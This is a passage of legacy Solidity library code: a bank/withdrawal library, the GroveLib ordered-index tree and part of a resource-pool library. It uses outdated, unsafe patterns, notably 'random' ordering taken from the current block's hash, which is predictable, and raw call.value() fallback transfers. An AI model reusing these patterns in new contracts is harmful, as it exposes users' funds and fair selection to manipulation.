 Returns boolean for whether the deposit was successful\r\r\n        \/\/\/ @param self The Bank instance to operate on.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds should be added to.\r\r\n        \/\/\/ @param value The amount that should be added to the account.\r\r\n        function deposit(Bank storage self, address accountAddress, uint value) public returns (bool) {\r\r\n                addFunds(self, accountAddress, value);\r\r\n                return true;\r\r\n        }\r\r\n\r\r\n        event _Withdrawal(address indexed accountAddress, uint value);\r\r\n\r\r\n        \/\/\/ @dev Function wrapper around the _Withdrawal event so that it can be used by contracts.  Can be used to log a withdrawl from an account.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds were withdrawn from.\r\r\n        \/\/\/ @param value The amount that was withdrawn to the account.\r\r\n        function Withdrawal(address accountAddress, uint value) public {\r\r\n            _Withdrawal(accountAddress, value);\r\r\n        }\r\r\n\r\r\n        event _InsufficientFunds(address indexed accountAddress, uint value, uint balance);\r\r\n\r\r\n        \/\/\/ @dev Function wrapper around the _InsufficientFunds event so that it can be used by contracts.  Can be used to log a failed withdrawl from an account.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds were to be withdrawn from.\r\r\n        \/\/\/ @param value The amount that was attempted to be withdrawn from the account.\r\r\n        \/\/\/ @param balance The current balance of the account.\r\r\n        function InsufficientFunds(address accountAddress, uint value, uint balance) public {\r\r\n            _InsufficientFunds(accountAddress, value, balance);\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Low level method for removing funds from an account.  Protects against underflow.\r\r\n        \/\/\/ @param self The Bank instance to operate on.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds should be deducted from.\r\r\n        \/\/\/ @param value The amount that should be deducted from the account.\r\r\n        function deductFunds(Bank storage self, address accountAddress, uint value) public {\r\r\n                \/*\r\r\n                 *  Helper function that should be used for any reduction of\r\r\n                 *  account funds.  It has error checking to prevent\r\r\n                 *  underflowing the account balance which would be REALLY bad.\r\r\n                 *\/\r\r\n                if (value > self.accountBalances[accountAddress]) {\r\r\n                        \/\/ Prevent Underflow.\r\r\n                        throw;\r\r\n                }\r\r\n                self.accountBalances[accountAddress] -= value;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Safe function for withdrawing funds.  Returns boolean for whether the deposit was successful as well as sending the amount in ether to the account address.\r\r\n        \/\/\/ @param self The Bank instance to operate on.\r\r\n        \/\/\/ @param accountAddress The address of the account the funds should be withdrawn from.\r\r\n        \/\/\/ @param value The amount that should be withdrawn from the account.\r\r\n        function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {\r\r\n                \/*\r\r\n                 *  Public API for withdrawing funds.\r\r\n                 *\/\r\r\n                if (self.accountBalances[accountAddress] >= value) {\r\r\n                        deductFunds(self, accountAddress, value);\r\r\n                        if (!accountAddress.send(value)) {\r\r\n                                \/\/ Potentially sending money to a contract that\r\r\n                                \/\/ has a fallback function.  So instead, try\r\r\n                                \/\/ tranferring the funds with the call api.\r\r\n                                if (!accountAddress.call.value(value)()) {\r\r\n                                        \/\/ Revert the entire transaction.  No\r\r\n                                        \/\/ need to destroy the funds.\r\r\n                                        throw;\r\r\n                                }\r\r\n                        }\r\r\n                        return true;\r\r\n                }\r\r\n                return false;\r\r\n        }\r\r\n}\r\r\n\r\r\n\/\/ Grove v0.3 (not the same as the 0.3 release of this library)\r\r\n\r\r\n\r\r\n\/\/\/ @title GroveLib - Library for queriable indexed ordered data.\r\r\n\/\/\/ @author PiperMerriam - \r\r\nlibrary GroveLib {\r\r\n        \/*\r\r\n         *  Indexes for ordered data\r\r\n         *\r\r\n         *  Address: 0x920c890a90db8fba7604864b0cf38ee667331323\r\r\n         *\/\r\r\n        struct Index {\r\r\n                bytes32 root;\r\r\n                mapping (bytes32 => Node) nodes;\r\r\n        }\r\r\n\r\r\n        struct Node {\r\r\n                bytes32 id;\r\r\n                int value;\r\r\n                bytes32 parent;\r\r\n                bytes32 left;\r\r\n                bytes32 right;\r\r\n                uint height;\r\r\n        }\r\r\n\r\r\n        function max(uint a, uint b) internal returns (uint) {\r\r\n            if (a >= b) {\r\r\n                return a;\r\r\n            }\r\r\n            return b;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         *  Node getters\r\r\n         *\/\r\r\n        \/\/\/ @dev Retrieve the unique identifier for the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeId(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            return index.nodes[id].id;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the value for the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeValue(Index storage index, bytes32 id) constant returns (int) {\r\r\n            return index.nodes[id].value;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the height of the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeHeight(Index storage index, bytes32 id) constant returns (uint) {\r\r\n            return index.nodes[id].height;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the parent id of the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeParent(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            return index.nodes[id].parent;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the left child id of the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeLeftChild(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            return index.nodes[id].left;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the right child id of the node.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNodeRightChild(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            return index.nodes[id].right;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the node id of the next node in the tree.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getPreviousNode(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            Node storage currentNode = index.nodes[id];\r\r\n\r\r\n            if (currentNode.id == 0x0) {\r\r\n                \/\/ Unknown node, just return 0x0;\r\r\n                return 0x0;\r\r\n            }\r\r\n\r\r\n            Node memory child;\r\r\n\r\r\n            if (currentNode.left != 0x0) {\r\r\n                \/\/ Trace left to latest child in left tree.\r\r\n                child = index.nodes[currentNode.left];\r\r\n\r\r\n                while (child.right != 0) {\r\r\n                    child = index.nodes[child.right];\r\r\n                }\r\r\n                return child.id;\r\r\n            }\r\r\n\r\r\n            if (currentNode.parent != 0x0) {\r\r\n                \/\/ Now we trace back up through parent relationships, looking\r\r\n                \/\/ for a link where the child is the right child of it&#39;s\r\r\n                \/\/ parent.\r\r\n                Node storage parent = index.nodes[currentNode.parent];\r\r\n                child = currentNode;\r\r\n\r\r\n                while (true) {\r\r\n                    if (parent.right == child.id) {\r\r\n                        return parent.id;\r\r\n                    }\r\r\n\r\r\n                    if (parent.parent == 0x0) {\r\r\n                        break;\r\r\n                    }\r\r\n                    child = parent;\r\r\n                    parent = index.nodes[parent.parent];\r\r\n                }\r\r\n            }\r\r\n\r\r\n            \/\/ This is the first node, and has no previous node.\r\r\n            return 0x0;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Retrieve the node id of the previous node in the tree.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The id for the node to be looked up.\r\r\n        function getNextNode(Index storage index, bytes32 id) constant returns (bytes32) {\r\r\n            Node storage currentNode = index.nodes[id];\r\r\n\r\r\n            if (currentNode.id == 0x0) {\r\r\n                \/\/ Unknown node, just return 0x0;\r\r\n                return 0x0;\r\r\n            }\r\r\n\r\r\n            Node memory child;\r\r\n\r\r\n            if (currentNode.right != 0x0) {\r\r\n                \/\/ Trace right to earliest child in right tree.\r\r\n                child = index.nodes[currentNode.right];\r\r\n\r\r\n                while (child.left != 0) {\r\r\n                    child = index.nodes[child.left];\r\r\n                }\r\r\n                return child.id;\r\r\n            }\r\r\n\r\r\n            if (currentNode.parent != 0x0) {\r\r\n                \/\/ if the node is the left child of it&#39;s parent, then the\r\r\n                \/\/ parent is the next one.\r\r\n                Node storage parent = index.nodes[currentNode.parent];\r\r\n                child = currentNode;\r\r\n\r\r\n                while (true) {\r\r\n                    if (parent.left == child.id) {\r\r\n                        return parent.id;\r\r\n                    }\r\r\n\r\r\n                    if (parent.parent == 0x0) {\r\r\n                        break;\r\r\n                    }\r\r\n                    child = parent;\r\r\n                    parent = index.nodes[parent.parent];\r\r\n                }\r\r\n\r\r\n                \/\/ Now we need to trace all the way up checking to see if any parent is the \r\r\n            }\r\r\n\r\r\n            \/\/ This is the final node.\r\r\n            return 0x0;\r\r\n        }\r\r\n\r\r\n\r\r\n        \/\/\/ @dev Updates or Inserts the id into the index at its appropriate location based on the value provided.\r\r\n        \/\/\/ @param index The index that the node is part of.\r\r\n        \/\/\/ @param id The unique identifier of the data element the index node will represent.\r\r\n        \/\/\/ @param value The value of the data element that represents it&#39;s total ordering with respect to other elementes.\r\r\n        function insert(Index storage index, bytes32 id, int value) public {\r\r\n                if (index.nodes[id].id == id) {\r\r\n                    \/\/ A node with this id already exists.  If the value is\r\r\n                    \/\/ the same, then just return early, otherwise, remove it\r\r\n                    \/\/ and reinsert it.\r\r\n                    if (index.nodes[id].value == value) {\r\r\n                        return;\r\r\n                    }\r\r\n                    remove(index, id);\r\r\n                }\r\r\n\r\r\n                uint leftHeight;\r\r\n                uint rightHeight;\r\r\n\r\r\n                bytes32 previousNodeId = 0x0;\r\r\n\r\r\n                if (index.root == 0x0) {\r\r\n                    index.root = id;\r\r\n                }\r\r\n                Node storage currentNode = index.nodes[index.root];\r\r\n\r\r\n                \/\/ Do insertion\r\r\n                while (true) {\r\r\n                    if (currentNode.id == 0x0) {\r\r\n                        \/\/ This is a new unpopulated node.\r\r\n                        currentNode.id = id;\r\r\n                        currentNode.parent = previousNodeId;\r\r\n                        currentNode.value = value;\r\r\n                        break;\r\r\n                    }\r\r\n\r\r\n                    \/\/ Set the previous node id.\r\r\n                    previousNodeId = currentNode.id;\r\r\n\r\r\n                    \/\/ The new node belongs in the right subtree\r\r\n                    if (value >= currentNode.value) {\r\r\n                        if (currentNode.right == 0x0) {\r\r\n                            currentNode.right = id;\r\r\n                        }\r\r\n                        currentNode = index.nodes[currentNode.right];\r\r\n                        continue;\r\r\n                    }\r\r\n\r\r\n                    \/\/ The new node belongs in the left subtree.\r\r\n                    if (currentNode.left == 0x0) {\r\r\n                        currentNode.left = id;\r\r\n                    }\r\r\n                    currentNode = index.nodes[currentNode.left];\r\r\n                }\r\r\n\r\r\n                \/\/ Rebalance the tree\r\r\n                _rebalanceTree(index, currentNode.id);\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Checks whether a node for the given unique identifier exists within the given index.\r\r\n        \/\/\/ @param index The index that should be searched\r\r\n        \/\/\/ @param id The unique identifier of the data element to check for.\r\r\n        function exists(Index storage index, bytes32 id) constant returns (bool) {\r\r\n            return (index.nodes[id].id == id);\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Remove the node for the given unique identifier from the index.\r\r\n        \/\/\/ @param index The index that should be removed\r\r\n        \/\/\/ @param id The unique identifier of the data element to remove.\r\r\n        function remove(Index storage index, bytes32 id) public {\r\r\n            Node storage replacementNode;\r\r\n            Node storage parent;\r\r\n            Node storage child;\r\r\n            bytes32 rebalanceOrigin;\r\r\n\r\r\n            Node storage nodeToDelete = index.nodes[id];\r\r\n\r\r\n            if (nodeToDelete.id != id) {\r\r\n                \/\/ The id does not exist in the tree.\r\r\n                return;\r\r\n            }\r\r\n\r\r\n            if (nodeToDelete.left != 0x0 || nodeToDelete.right != 0x0) {\r\r\n                \/\/ This node is not a leaf node and thus must replace itself in\r\r\n                \/\/ it&#39;s tree by either the previous or next node.\r\r\n                if (nodeToDelete.left != 0x0) {\r\r\n                    \/\/ This node is guaranteed to not have a right child.\r\r\n                    replacementNode = index.nodes[getPreviousNode(index, nodeToDelete.id)];\r\r\n                }\r\r\n                else {\r\r\n                    \/\/ This node is guaranteed to not have a left child.\r\r\n                    replacementNode = index.nodes[getNextNode(index, nodeToDelete.id)];\r\r\n                }\r\r\n                \/\/ The replacementNode is guaranteed to have a parent.\r\r\n                parent = index.nodes[replacementNode.parent];\r\r\n\r\r\n                \/\/ Keep note of the location that our tree rebalancing should\r\r\n                \/\/ start at.\r\r\n                rebalanceOrigin = replacementNode.id;\r\r\n\r\r\n                \/\/ Join the parent of the replacement node with any subtree of\r\r\n                \/\/ the replacement node.  We can guarantee that the replacement\r\r\n                \/\/ node has at most one subtree because of how getNextNode and\r\r\n                \/\/ getPreviousNode are used.\r\r\n                if (parent.left == replacementNode.id) {\r\r\n                    parent.left = replacementNode.right;\r\r\n                    if (replacementNode.right != 0x0) {\r\r\n                        child = index.nodes[replacementNode.right];\r\r\n                        child.parent = parent.id;\r\r\n                    }\r\r\n                }\r\r\n                if (parent.right == replacementNode.id) {\r\r\n                    parent.right = replacementNode.left;\r\r\n                    if (replacementNode.left != 0x0) {\r\r\n                        child = index.nodes[replacementNode.left];\r\r\n                        child.parent = parent.id;\r\r\n                    }\r\r\n                }\r\r\n\r\r\n                \/\/ Now we replace the nodeToDelete with the replacementNode.\r\r\n                \/\/ This includes parent\/child relationships for all of the\r\r\n                \/\/ parent, the left child, and the right child.\r\r\n                replacementNode.parent = nodeToDelete.parent;\r\r\n                if (nodeToDelete.parent != 0x0) {\r\r\n                    parent = index.nodes[nodeToDelete.parent];\r\r\n                    if (parent.left == nodeToDelete.id) {\r\r\n                        parent.left = replacementNode.id;\r\r\n                    }\r\r\n                    if (parent.right == nodeToDelete.id) {\r\r\n                        parent.right = replacementNode.id;\r\r\n                    }\r\r\n                }\r\r\n                else {\r\r\n                    \/\/ If the node we are deleting is the root node update the\r\r\n                    \/\/ index root node pointer.\r\r\n                    index.root = replacementNode.id;\r\r\n                }\r\r\n\r\r\n                replacementNode.left = nodeToDelete.left;\r\r\n                if (nodeToDelete.left != 0x0) {\r\r\n                    child = index.nodes[nodeToDelete.left];\r\r\n                    child.parent = replacementNode.id;\r\r\n                }\r\r\n\r\r\n                replacementNode.right = nodeToDelete.right;\r\r\n                if (nodeToDelete.right != 0x0) {\r\r\n                    child = index.nodes[nodeToDelete.right];\r\r\n                    child.parent = replacementNode.id;\r\r\n                }\r\r\n            }\r\r\n            else if (nodeToDelete.parent != 0x0) {\r\r\n                \/\/ The node being deleted is a leaf node so we only erase it&#39;s\r\r\n                \/\/ parent linkage.\r\r\n                parent = index.nodes[nodeToDelete.parent];\r\r\n\r\r\n                if (parent.left == nodeToDelete.id) {\r\r\n                    parent.left = 0x0;\r\r\n                }\r\r\n                if (parent.right == nodeToDelete.id) {\r\r\n                    parent.right = 0x0;\r\r\n                }\r\r\n\r\r\n                \/\/ keep note of where the rebalancing should begin.\r\r\n                rebalanceOrigin = parent.id;\r\r\n            }\r\r\n            else {\r\r\n                \/\/ This is both a leaf node and the root node, so we need to\r\r\n                \/\/ unset the root node pointer.\r\r\n                index.root = 0x0;\r\r\n            }\r\r\n\r\r\n            \/\/ Now we zero out all of the fields on the nodeToDelete.\r\r\n            nodeToDelete.id = 0x0;\r\r\n            nodeToDelete.value = 0;\r\r\n            nodeToDelete.parent = 0x0;\r\r\n            nodeToDelete.left = 0x0;\r\r\n            nodeToDelete.right = 0x0;\r\r\n\r\r\n            \/\/ Walk back up the tree rebalancing\r\r\n            if (rebalanceOrigin != 0x0) {\r\r\n                _rebalanceTree(index, rebalanceOrigin);\r\r\n            }\r\r\n        }\r\r\n\r\r\n        bytes2 constant GT = \">\";\r\r\n        bytes2 constant LT = \"<\";\r\r\n        bytes2 constant GTE = \">=\";\r\r\n        bytes2 constant LTE = \"<=\";\r\r\n        bytes2 constant EQ = \"==\";\r\r\n\r\r\n        function _compare(int left, bytes2 operator, int right) internal returns (bool) {\r\r\n            if (operator == GT) {\r\r\n                return (left > right);\r\r\n            }\r\r\n            if (operator == LT) {\r\r\n                return (left < right);\r\r\n            }\r\r\n            if (operator == GTE) {\r\r\n                return (left >= right);\r\r\n            }\r\r\n            if (operator == LTE) {\r\r\n                return (left <= right);\r\r\n            }\r\r\n            if (operator == EQ) {\r\r\n                return (left == right);\r\r\n            }\r\r\n\r\r\n            \/\/ Invalid operator.\r\r\n            throw;\r\r\n        }\r\r\n\r\r\n        function _getMaximum(Index storage index, bytes32 id) internal returns (int) {\r\r\n                Node storage currentNode = index.nodes[id];\r\r\n\r\r\n                while (true) {\r\r\n                    if (currentNode.right == 0x0) {\r\r\n                        return currentNode.value;\r\r\n                    }\r\r\n                    currentNode = index.nodes[currentNode.right];\r\r\n                }\r\r\n        }\r\r\n\r\r\n        function _getMinimum(Index storage index, bytes32 id) internal returns (int) {\r\r\n                Node storage currentNode = index.nodes[id];\r\r\n\r\r\n                while (true) {\r\r\n                    if (currentNode.left == 0x0) {\r\r\n                        return currentNode.value;\r\r\n                    }\r\r\n                    currentNode = index.nodes[currentNode.left];\r\r\n                }\r\r\n        }\r\r\n\r\r\n\r\r\n        \/** @dev Query the index for the edge-most node that satisfies the\r\r\n         *  given query.  For >, >=, and ==, this will be the left-most node\r\r\n         *  that satisfies the comparison.  For < and <= this will be the\r\r\n         *  right-most node that satisfies the comparison.\r\r\n         *\/\r\r\n        \/\/\/ @param index The index that should be queried\r\r\n        \/** @param operator One of &#39;>&#39;, &#39;>=&#39;, &#39;<&#39;, &#39;<=&#39;, &#39;==&#39; to specify what\r\r\n         *  type of comparison operator should be used.\r\r\n         *\/\r\r\n        function query(Index storage index, bytes2 operator, int value) public returns (bytes32) {\r\r\n                bytes32 rootNodeId = index.root;\r\r\n                \r\r\n                if (rootNodeId == 0x0) {\r\r\n                    \/\/ Empty tree.\r\r\n                    return 0x0;\r\r\n                }\r\r\n\r\r\n                Node storage currentNode = index.nodes[rootNodeId];\r\r\n\r\r\n                while (true) {\r\r\n                    if (_compare(currentNode.value, operator, value)) {\r\r\n                        \/\/ We have found a match but it might not be the\r\r\n                        \/\/ *correct* match.\r\r\n                        if ((operator == LT) || (operator == LTE)) {\r\r\n                            \/\/ Need to keep traversing right until this is no\r\r\n                            \/\/ longer true.\r\r\n                            if (currentNode.right == 0x0) {\r\r\n                                return currentNode.id;\r\r\n                            }\r\r\n                            if (_compare(_getMinimum(index, currentNode.right), operator, value)) {\r\r\n                                \/\/ There are still nodes to the right that\r\r\n                                \/\/ match.\r\r\n                                currentNode = index.nodes[currentNode.right];\r\r\n                                continue;\r\r\n                            }\r\r\n                            return currentNode.id;\r\r\n                        }\r\r\n\r\r\n                        if ((operator == GT) || (operator == GTE) || (operator == EQ)) {\r\r\n                            \/\/ Need to keep traversing left until this is no\r\r\n                            \/\/ longer true.\r\r\n                            if (currentNode.left == 0x0) {\r\r\n                                return currentNode.id;\r\r\n                            }\r\r\n                            if (_compare(_getMaximum(index, currentNode.left), operator, value)) {\r\r\n                                currentNode = index.nodes[currentNode.left];\r\r\n                                continue;\r\r\n                            }\r\r\n                            return currentNode.id;\r\r\n                        }\r\r\n                    }\r\r\n\r\r\n                    if ((operator == LT) || (operator == LTE)) {\r\r\n                        if (currentNode.left == 0x0) {\r\r\n                            \/\/ There are no nodes that are less than the value\r\r\n                            \/\/ so return null.\r\r\n                            return 0x0;\r\r\n                        }\r\r\n                        currentNode = index.nodes[currentNode.left];\r\r\n                        continue;\r\r\n                    }\r\r\n\r\r\n                    if ((operator == GT) || (operator == GTE)) {\r\r\n                        if (currentNode.right == 0x0) {\r\r\n                            \/\/ There are no nodes that are greater than the value\r\r\n                            \/\/ so return null.\r\r\n                            return 0x0;\r\r\n                        }\r\r\n                        currentNode = index.nodes[currentNode.right];\r\r\n                        continue;\r\r\n                    }\r\r\n\r\r\n                    if (operator == EQ) {\r\r\n                        if (currentNode.value < value) {\r\r\n                            if (currentNode.right == 0x0) {\r\r\n                                return 0x0;\r\r\n                            }\r\r\n                            currentNode = index.nodes[currentNode.right];\r\r\n                            continue;\r\r\n                        }\r\r\n\r\r\n                        if (currentNode.value > value) {\r\r\n                            if (currentNode.left == 0x0) {\r\r\n                                return 0x0;\r\r\n                            }\r\r\n                            currentNode = index.nodes[currentNode.left];\r\r\n                            continue;\r\r\n                        }\r\r\n                    }\r\r\n                }\r\r\n        }\r\r\n\r\r\n        function _rebalanceTree(Index storage index, bytes32 id) internal {\r\r\n            \/\/ Trace back up rebalancing the tree and updating heights as\r\r\n            \/\/ needed..\r\r\n            Node storage currentNode = index.nodes[id];\r\r\n\r\r\n            while (true) {\r\r\n                int balanceFactor = _getBalanceFactor(index, currentNode.id);\r\r\n\r\r\n                if (balanceFactor == 2) {\r\r\n                    \/\/ Right rotation (tree is heavy on the left)\r\r\n                    if (_getBalanceFactor(index, currentNode.left) == -1) {\r\r\n                        \/\/ The subtree is leaning right so it need to be\r\r\n                        \/\/ rotated left before the current node is rotated\r\r\n                        \/\/ right.\r\r\n                        _rotateLeft(index, currentNode.left);\r\r\n                    }\r\r\n                    _rotateRight(index, currentNode.id);\r\r\n                }\r\r\n\r\r\n                if (balanceFactor == -2) {\r\r\n                    \/\/ Left rotation (tree is heavy on the right)\r\r\n                    if (_getBalanceFactor(index, currentNode.right) == 1) {\r\r\n                        \/\/ The subtree is leaning left so it need to be\r\r\n                        \/\/ rotated right before the current node is rotated\r\r\n                        \/\/ left.\r\r\n                        _rotateRight(index, currentNode.right);\r\r\n                    }\r\r\n                    _rotateLeft(index, currentNode.id);\r\r\n                }\r\r\n\r\r\n                if ((-1 <= balanceFactor) && (balanceFactor <= 1)) {\r\r\n                    _updateNodeHeight(index, currentNode.id);\r\r\n                }\r\r\n\r\r\n                if (currentNode.parent == 0x0) {\r\r\n                    \/\/ Reached the root which may be new due to tree\r\r\n                    \/\/ rotation, so set it as the root and then break.\r\r\n                    break;\r\r\n                }\r\r\n\r\r\n                currentNode = index.nodes[currentNode.parent];\r\r\n            }\r\r\n        }\r\r\n\r\r\n        function _getBalanceFactor(Index storage index, bytes32 id) internal returns (int) {\r\r\n                Node storage node = index.nodes[id];\r\r\n\r\r\n                return int(index.nodes[node.left].height) - int(index.nodes[node.right].height);\r\r\n        }\r\r\n\r\r\n        function _updateNodeHeight(Index storage index, bytes32 id) internal {\r\r\n                Node storage node = index.nodes[id];\r\r\n\r\r\n                node.height = max(index.nodes[node.left].height, index.nodes[node.right].height) + 1;\r\r\n        }\r\r\n\r\r\n        function _rotateLeft(Index storage index, bytes32 id) internal {\r\r\n            Node storage originalRoot = index.nodes[id];\r\r\n\r\r\n            if (originalRoot.right == 0x0) {\r\r\n                \/\/ Cannot rotate left if there is no right originalRoot to rotate into\r\r\n                \/\/ place.\r\r\n                throw;\r\r\n            }\r\r\n\r\r\n            \/\/ The right child is the new root, so it gets the original\r\r\n            \/\/ `originalRoot.parent` as it&#39;s parent.\r\r\n            Node storage newRoot = index.nodes[originalRoot.right];\r\r\n            newRoot.parent = originalRoot.parent;\r\r\n\r\r\n            \/\/ The original root needs to have it&#39;s right child nulled out.\r\r\n            originalRoot.right = 0x0;\r\r\n\r\r\n            if (originalRoot.parent != 0x0) {\r\r\n                \/\/ If there is a parent node, it needs to now point downward at\r\r\n                \/\/ the newRoot which is rotating into the place where `node` was.\r\r\n                Node storage parent = index.nodes[originalRoot.parent];\r\r\n\r\r\n                \/\/ figure out if we&#39;re a left or right child and have the\r\r\n                \/\/ parent point to the new node.\r\r\n                if (parent.left == originalRoot.id) {\r\r\n                    parent.left = newRoot.id;\r\r\n                }\r\r\n                if (parent.right == originalRoot.id) {\r\r\n                    parent.right = newRoot.id;\r\r\n                }\r\r\n            }\r\r\n\r\r\n\r\r\n            if (newRoot.left != 0) {\r\r\n                \/\/ If the new root had a left child, that moves to be the\r\r\n                \/\/ new right child of the original root node\r\r\n                Node storage leftChild = index.nodes[newRoot.left];\r\r\n                originalRoot.right = leftChild.id;\r\r\n                leftChild.parent = originalRoot.id;\r\r\n            }\r\r\n\r\r\n            \/\/ Update the newRoot&#39;s left node to point at the original node.\r\r\n            originalRoot.parent = newRoot.id;\r\r\n            newRoot.left = originalRoot.id;\r\r\n\r\r\n            if (newRoot.parent == 0x0) {\r\r\n                index.root = newRoot.id;\r\r\n            }\r\r\n\r\r\n            \/\/ TODO: are both of these updates necessary?\r\r\n            _updateNodeHeight(index, originalRoot.id);\r\r\n            _updateNodeHeight(index, newRoot.id);\r\r\n        }\r\r\n\r\r\n        function _rotateRight(Index storage index, bytes32 id) internal {\r\r\n            Node storage originalRoot = index.nodes[id];\r\r\n\r\r\n            if (originalRoot.left == 0x0) {\r\r\n                \/\/ Cannot rotate right if there is no left node to rotate into\r\r\n                \/\/ place.\r\r\n                throw;\r\r\n            }\r\r\n\r\r\n            \/\/ The left child is taking the place of node, so we update it&#39;s\r\r\n            \/\/ parent to be the original parent of the node.\r\r\n            Node storage newRoot = index.nodes[originalRoot.left];\r\r\n            newRoot.parent = originalRoot.parent;\r\r\n\r\r\n            \/\/ Null out the originalRoot.left\r\r\n            originalRoot.left = 0x0;\r\r\n\r\r\n            if (originalRoot.parent != 0x0) {\r\r\n                \/\/ If the node has a parent, update the correct child to point\r\r\n                \/\/ at the newRoot now.\r\r\n                Node storage parent = index.nodes[originalRoot.parent];\r\r\n\r\r\n                if (parent.left == originalRoot.id) {\r\r\n                    parent.left = newRoot.id;\r\r\n                }\r\r\n                if (parent.right == originalRoot.id) {\r\r\n                    parent.right = newRoot.id;\r\r\n                }\r\r\n            }\r\r\n\r\r\n            if (newRoot.right != 0x0) {\r\r\n                Node storage rightChild = index.nodes[newRoot.right];\r\r\n                originalRoot.left = newRoot.right;\r\r\n                rightChild.parent = originalRoot.id;\r\r\n            }\r\r\n\r\r\n            \/\/ Update the new root&#39;s right node to point to the original node.\r\r\n            originalRoot.parent = newRoot.id;\r\r\n            newRoot.right = originalRoot.id;\r\r\n\r\r\n            if (newRoot.parent == 0x0) {\r\r\n                index.root = newRoot.id;\r\r\n            }\r\r\n\r\r\n            \/\/ Recompute heights.\r\r\n            _updateNodeHeight(index, originalRoot.id);\r\r\n            _updateNodeHeight(index, newRoot.id);\r\r\n        }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ Resource Pool v0.1.0 (has been modified from the main released version of this library)\r\r\n\r\r\n\r\r\n\/\/ @title ResourcePoolLib - Library for a set of resources that are ready for use.\r\r\n\/\/ @author Piper Merriam \r\r\nlibrary ResourcePoolLib {\r\r\n        \/*\r\r\n         *  Address: 0xd6bbd16eaa6ea3f71a458bffc64c0ca24fc8c58e\r\r\n         *\/\r\r\n        struct Pool {\r\r\n                uint rotationDelay;\r\r\n                uint overlapSize;\r\r\n                uint freezePeriod;\r\r\n\r\r\n                uint _id;\r\r\n\r\r\n                GroveLib.Index generationStart;\r\r\n                GroveLib.Index generationEnd;\r\r\n\r\r\n                mapping (uint => Generation) generations;\r\r\n                mapping (address => uint) bonds;\r\r\n        }\r\r\n\r\r\n        \/*\r\r\n         * Generations have the following properties.\r\r\n         *\r\r\n         * 1. Must always overlap by a minimum amount specified by MIN_OVERLAP.\r\r\n         *\r\r\n         *    1   2   3   4   5   6   7   8   9   10  11  12  13\r\r\n         *    [1:-----------------]\r\r\n         *                [4:--------------------->\r\r\n         *\/\r\r\n        struct Generation {\r\r\n                uint id;\r\r\n                uint startAt;\r\r\n                uint endAt;\r\r\n                address[] members;\r\r\n        }\r\r\n\r\r\n        \/\/\/ @dev Creates the next generation for the given pool.  All members from the current generation are carried over (with their order randomized).  The current generation will have it&#39;s endAt block set.\r\r\n        \/\/\/ @param self The pool to operate on.\r\r\n        function createNextGeneration(Pool storage self) public returns (uint) {\r\r\n                \/*\r\r\n                 *  Creat a new pool generation with all of the current\r\r\n                 *  generation&#39;s members copied over in random order.\r\r\n                 *\/\r\r\n                Generation storage previousGeneration = self.generations[self._id];\r\r\n\r\r\n                self._id += 1;\r\r\n                Generation storage nextGeneration = self.generations[self._id];\r\r\n                nextGeneration.id = self._id;\r\r\n                nextGeneration.startAt = block.number + self.freezePeriod + self.rotationDelay;\r\r\n                GroveLib.insert(self.generationStart, StringLib.uintToBytes(nextGeneration.id), int(nextGeneration.startAt));\r\r\n\r\r\n                if (previousGeneration.id == 0) {\r\r\n                        \/\/ This is the first generation so we just need to set\r\r\n                        \/\/ it&#39;s `id` and `startAt`.\r\r\n                        return nextGeneration.id;\r\r\n                }\r\r\n\r\r\n                \/\/ Set the end date for the current generation.\r\r\n                previousGeneration.endAt = block.number + self.freezePeriod + self.rotationDelay + self.overlapSize;\r\r\n                GroveLib.insert(self.generationEnd, StringLib.uintToBytes(previousGeneration.id), int(previousGeneration.endAt));\r\r\n\r\r\n                \/\/ Now we copy the members of the previous generation over to\r\r\n                \/\/ the next generation as well as randomizing their order.\r\r\n                address[] memory members = previousGeneration.members;\r\r\n\r\r\n                for (uint i = 0; i < members.length; i++) {\r\r\n                    \/\/ Pick a *random* index and push it onto the next\r\r\n                    \/\/ generation&#39;s members.\r\r\n                    uint index = uint(sha3(block.blockhash(block.number))) % (members.length - nextGeneration.members.length);\r\r\n                    nextGeneration.members.length += 1;\r\r\n                    nextGeneration.members[nextGeneration.members.length - 1] = members[index];\r\r\n\r\r\n                    \/\/ Then move the member at the last index into the picked\r\r\n                    \/\/ index&#39;s location.\r\r\n                    members[index] = members[members.length - 1];\r\r\n                }\r\r\n\r\r\n                